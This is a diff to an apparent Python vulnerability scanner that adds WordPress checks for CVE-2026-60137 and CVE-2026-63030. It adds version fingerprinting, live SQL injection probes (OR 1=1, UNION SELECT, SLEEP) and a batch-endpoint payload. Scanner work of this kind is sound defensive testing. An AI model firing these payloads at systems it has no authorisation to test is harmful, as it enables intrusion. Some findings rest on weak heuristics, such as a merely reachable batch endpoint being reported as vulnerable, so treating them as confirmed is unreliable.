@@ -2310,4 +2310,183 @@ Content-Type: {content_type}\r
                         ))
                         break
         
+        # ========== 7. CVE-2026-60137: WP_Query author__not_in SQL Injection ==========
+        # Affects: WordPress 6.8.x < 6.8.6, 6.9.x < 6.9.5, 7.0.x < 7.0.2
+        # CWE-89: SQL Injection via author__not_in parameter
+        # CISA KEV: Known Exploited Vulnerability
+        
+        # First, detect WordPress version
+        wp_version = None
+        version_paths = [
+            "/wp-includes/version.php",
+            "/readme.html",
+            "/feed/",
+            "/wp-json/",
+        ]
+        
+        for vpath in version_paths:
+            vurl = f"{base_url}{vpath}"
+            vresp = self._make_request("GET", vurl)
+            
+            if vresp.status_code == 200:
+                # Extract version from various sources
+                import re
+                # From version.php: $wp_version = '7.0.1';
+                match = re.search(r"\$wp_version\s*=\s*['\"]([0-9.]+)['\"]", vresp.body)
+                if match:
+                    wp_version = match.group(1)
+                    break
+                # From readme.html: <br /> Version 7.0.1
+                match = re.search(r"Version\s+([0-9.]+)", vresp.body)
+                if match:
+                    wp_version = match.group(1)
+                    break
+                # From generator meta tag
+                match = re.search(r'generator.*WordPress\s+([0-9.]+)', vresp.body)
+                if match:
+                    wp_version = match.group(1)
+                    break
+        
+        if wp_version:
+            self._log(f"[+] WordPress version detected: {wp_version}")
+            
+            # Check if version is vulnerable to CVE-2026-60137
+            def version_tuple(v):
+                return tuple(map(int, v.split('.')[:3]))
+            
+            try:
+                vt = version_tuple(wp_version)
+                is_vuln_60137 = False
+                is_vuln_63030 = False
+                
+                # CVE-2026-60137: 6.8.x < 6.8.6, 6.9.x < 6.9.5, 7.0.x < 7.0.2
+                if (6, 8, 0) <= vt < (6, 8, 6):
+                    is_vuln_60137 = True
+                elif (6, 9, 0) <= vt < (6, 9, 5):
+                    is_vuln_60137 = True
+                    is_vuln_63030 = True  # Also vulnerable to CVE-2026-63030
+                elif (7, 0, 0) <= vt < (7, 0, 2):
+                    is_vuln_60137 = True
+                    is_vuln_63030 = True  # Also vulnerable to CVE-2026-63030
+                
+                if is_vuln_60137:
+                    self._log(f"[!] CRITICAL: WordPress {wp_version} vulnerable to CVE-2026-60137!")
+                    results.append(VulnTestResult(
+                        vuln_type="CVE-2026-60137: WordPress SQL Injection (CISA KEV)",
+                        payload=f"WordPress {wp_version}",
+                        target_url=base_url,
+                        request_data=f"Version: {wp_version}",
+                        response=vresp,
+                        is_vulnerable=True,
+                        confidence=0.95,
+                        evidence=f"WordPress {wp_version} is vulnerable to CVE-2026-60137 (author__not_in SQLi). CVSS 9.1 CRITICAL. Upgrade to 6.8.6+/6.9.5+/7.0.2+",
+                        evidence_hash=self._hash_evidence(f"CVE-2026-60137:{wp_version}")
+                    ))
+                
+                if is_vuln_63030:
+                    self._log(f"[!] CRITICAL: WordPress {wp_version} vulnerable to CVE-2026-63030 (RCE)!")
+                    results.append(VulnTestResult(
+                        vuln_type="CVE-2026-63030: WordPress REST API RCE (CISA KEV)",
+                        payload=f"WordPress {wp_version}",
+                        target_url=base_url,
+                        request_data=f"Version: {wp_version}",
+                        response=vresp,
+                        is_vulnerable=True,
+                        confidence=0.95,
+                        evidence=f"WordPress {wp_version} is vulnerable to CVE-2026-63030 (REST API batch + SQLi = RCE). CVSS 9.8 CRITICAL. Upgrade to 6.9.5+/7.0.2+",
+                        evidence_hash=self._hash_evidence(f"CVE-2026-63030:{wp_version}")
+                    ))
+            except:
+                pass
+        
+        # ========== 8. CVE-2026-60137/63030: Active Exploitation Test ==========
+        # Test for author__not_in SQL injection
+        sqli_test_urls = [
+            f"{base_url}/wp-json/wp/v2/posts?author__not_in[0]=1) OR 1=1--",
+            f"{base_url}/wp-json/wp/v2/posts?author__not_in=1) UNION SELECT 1--",
+            f"{base_url}/?rest_route=/wp/v2/posts&author__not_in[0]=1) OR SLEEP(2)--",
+        ]
+        
+        for sqli_url in sqli_test_urls:
+            sqli_resp = self._make_request("GET", sqli_url)
+            
+            # Check for SQLi indicators
+            sqli_indicators = [
+                "SQL syntax",
+                "mysql_",
+                "mysqli_",
+                "PDOException",
+                "SQLSTATE",
+                "unclosed quotation",
+                "unterminated string",
+            ]
+            
+            if sqli_resp.status_code == 200 or any(ind in sqli_resp.body for ind in sqli_indicators):
+                # Time-based check for blind SQLi
+                if "SLEEP" in sqli_url and sqli_resp.elapsed_ms >= 2000:
+                    self._log(f"[!] CONFIRMED: CVE-2026-60137 SQLi is exploitable (time-based)!")
+                    results.append(VulnTestResult(
+                        vuln_type="CVE-2026-60137: SQL Injection CONFIRMED (Time-Based)",
+                        payload=sqli_url,
+                        target_url=sqli_url,
+                        request_data=sqli_url,
+                        response=sqli_resp,
+                        is_vulnerable=True,
+                        confidence=0.99,
+                        evidence=f"Time-based SQLi confirmed: {sqli_resp.elapsed_ms}ms delay with SLEEP(2)",
+                        evidence_hash=self._hash_evidence(f"CVE-2026-60137-EXPLOIT:{sqli_resp.elapsed_ms}")
+                    ))
+                    break
+                elif any(ind in sqli_resp.body for ind in sqli_indicators):
+                    self._log(f"[!] CONFIRMED: CVE-2026-60137 SQLi error-based!")
+                    results.append(VulnTestResult(
+                        vuln_type="CVE-2026-60137: SQL Injection CONFIRMED (Error-Based)",
+                        payload=sqli_url,
+                        target_url=sqli_url,
+                        request_data=sqli_url,
+                        response=sqli_resp,
+                        is_vulnerable=True,
+                        confidence=0.98,
+                        evidence=f"SQL error in response indicates vulnerable endpoint",
+                        evidence_hash=self._hash_evidence(f"CVE-2026-60137-EXPLOIT:{sqli_resp.body[:200]}")
+                    ))
+                    break
+        
+        # ========== 9. CVE-2026-63030: REST API Batch Endpoint Test ==========
+        # Route confusion in /wp-json/batch/v1
+        batch_url = f"{base_url}/wp-json/batch/v1"
+        batch_payload = {
+            "requests": [
+                {
+                    "path": "/wp/v2/posts?author__not_in[0]=1) OR 1=1--",
+                    "method": "GET"
+                },
+                {
+                    "path": "/wp/v2/users",
+                    "method": "GET"
+                }
+            ]
+        }
+        
+        batch_resp = self._make_request("POST", batch_url, json_data=batch_payload)
+        
+        if batch_resp.status_code == 200:
+            try:
+                batch_data = json.loads(batch_resp.body)
+                if "responses" in batch_data or isinstance(batch_data, list):
+                    self._log(f"[!] REST API batch endpoint accessible - potential CVE-2026-63030")
+                    results.append(VulnTestResult(
+                        vuln_type="CVE-2026-63030: REST API Batch Endpoint Accessible",
+                        payload=json.dumps(batch_payload),
+                        target_url=batch_url,
+                        request_data=json.dumps(batch_payload),
+                        response=batch_resp,
+                        is_vulnerable=True,
+                        confidence=0.85,
+                        evidence="Batch endpoint accepts requests - combined with CVE-2026-60137 enables RCE",
+                        evidence_hash=self._hash_evidence(f"CVE-2026-63030:{batch_resp.body[:200]}")
+                    ))
+            except:
+                pass
+        
         return results
